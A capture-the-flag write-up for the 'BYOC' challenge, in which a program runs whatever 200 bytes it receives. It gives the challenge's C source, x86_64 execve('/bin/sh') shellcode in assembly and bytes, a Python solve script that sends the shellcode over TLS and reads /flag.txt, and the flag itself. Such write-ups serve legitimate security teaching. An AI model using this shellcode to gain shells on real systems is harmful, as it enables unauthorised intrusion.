# BYOC (Bring Your Own Code) - Solution Writeup

## The Challenge
**Description:**
> I got tired of hiding bugs for you to find, so I cut out the middleman
> You have 200 bytes of memory that is readable, writable and executable at your disposal
> Bring your own code.

**Flag:** `NNS{br0UgHt_y0ur_owN_c0de_aNd_tH3_KeRn31_r4n_1t}`

## Analysis

Looking at the provided source code in `chall.c`, the logic is incredibly minimal and straightforward:

```c
#include <sys/mman.h>
#include <unistd.h>

int main(void) {
    // 1. Allocate 200 bytes of memory that is Readable, Writable, and Executable (RWX)
    void *code = mmap(NULL, 200, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    write(STDOUT_FILENO, "> ", 2);
    
    // 2. Read up to 200 bytes of input directly into the RWX memory
    read(STDIN_FILENO, code, 200);
    
    // 3. Cast the memory to a function pointer and execute it unconditionally
    ((void (*)(void))code)();
}
```

The vulnerability here is intentional by design: it's an unrestricted **shellcode execution** challenge. There are no sandboxing or seccomp filters implemented to restrict the system calls we can make. This means any arbitrary code we send will simply be run by the CPU under the permissions of the program.

## Exploitation Strategy

Because there are no seccomp rules and we are executing on a standard Linux x86_64 architecture, we can simply provide a tiny payload (shellcode) that triggers the `execve` syscall to execute a shell (`/bin/sh`). 

The assembly for our shellcode looks like this:
```nasm
xor rsi, rsi                ; Clear rsi (set to 0) for envp
push rsi                    ; Push 0 to the stack (null terminator for the string)
mov rdi, 0x68732f2f6e69622f ; Move the string "/bin//sh" (in hex) into rdi
push rdi                    ; Push the string onto the stack
push rsp                    ; Push the stack pointer to rdi (pointer to "/bin//sh")
pop rdi                     ; Set rdi = "/bin//sh"
push 59                     ; Push 59 (the syscall number for execve)
pop rax                     ; Set rax = 59
cdq                         ; Convert double to quad, effectively zeroing rdx (argv = NULL)
syscall                     ; Trigger the system call!
```

When compiled to bytes, it takes just 23 bytes (well under the 200-byte limit):
`\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05`

## The Solve Script

To deliver the payload and interact with the service, we can use a short Python script using the standard `socket` and `ssl` libraries since the instance expects an encrypted connection (`ncat --ssl`).

```python
import socket
import ssl
import time

def solve():
    host = 'byoc-8eebfba484ed.chall.nnsc.tf'
    port = 1337

    # Bypass SSL verification since it's a CTF challenge
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            print("Connected!")
            
            # Read prompt "> "
            ssock.recv(1024)
            
            # x86_64 execve("/bin/sh") shellcode
            shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
            
            # 1. Send the shellcode to the server
            ssock.sendall(shellcode)
            
            time.sleep(1) # Small delay to ensure the shell opens
            
            # 2. We now have a shell! Send the command to read the flag
            ssock.sendall(b"cat /flag.txt\n")
            time.sleep(1)
            
            # 3. Print the flag
            print("Flag:", ssock.recv(4096).decode(errors='replace'))

if __name__ == "__main__":
    solve()
```
